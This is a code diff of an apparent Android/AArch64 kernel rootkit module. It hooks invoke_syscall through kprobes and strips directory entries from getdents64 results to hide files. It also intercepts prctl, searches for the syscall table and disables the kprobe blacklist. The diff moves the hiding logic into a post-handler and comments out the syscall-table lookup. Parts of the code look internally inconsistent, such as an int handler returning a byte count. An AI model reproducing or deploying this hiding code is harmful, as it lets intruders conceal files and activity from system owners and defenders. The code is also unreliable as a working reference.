@@ -48,11 +48,10 @@ unsigned long *get_syscall_table(void)
 	return syscall_table;
 }
 
-static int handler_pre(struct kprobe *p, struct pt_regs *regs)
+static int handler_post(struct kprobe *p, struct pt_regs *regs, int flags)
 {
     uint64_t v4;
     // int v5;
-
 	if ((uint32_t)(regs->regs[1]) == 61) { // getdents64
 		// wuwa_info("dents called");
 		int fd = *(int*)(regs->user_regs.regs[0]);
@@ -97,9 +96,11 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 			    {
 				    ret -= dir->d_reclen;
 				    memmove(dir, (void *)dir + dir->d_reclen, ret);
+					wuwa_info("skipped");
 				    continue;
 			    }
 			    prev->d_reclen += dir->d_reclen;
+				wuwa_info("skipped again");
 		    }
 		    else
 		    {
@@ -120,7 +121,13 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 	    kfree(kdirent);
 	    return ret;
 	}
+}
 
+static int handler_pre(struct kprobe *p, struct pt_regs *regs)
+{
+    uint64_t v4;
+    // int v5;
+	
     if ((uint32_t)(regs->regs[1]) == 167 /* syscall 29 on AArch64 */) {
         v4 = regs->user_regs.regs[0];
 		// wuwa_info("prctl called");
@@ -145,6 +152,7 @@ static int __init wuwa_init(void) {
 
     kpp.symbol_name = "invoke_syscall";
     kpp.pre_handler = handler_pre; 
+	kpp.post_handler = handler_post;
 
     ret = register_kprobe(&kpp);
 	if(ret < 0) {	
@@ -155,7 +163,7 @@ static int __init wuwa_init(void) {
 		isPHook = true;
         wuwa_info("p probe success");
 	}
-
+/*
 	__sys_call_table = get_syscall_table();
 	if (!__sys_call_table) {
 		wuwa_err("syscall table find error");
@@ -164,7 +172,7 @@ static int __init wuwa_init(void) {
 	
 	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
 	wuwa_info("dents found on %lx", orig_getdents64);
-
+*/
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0))
     ret = disable_kprobe_blacklist();
     if (ret) {
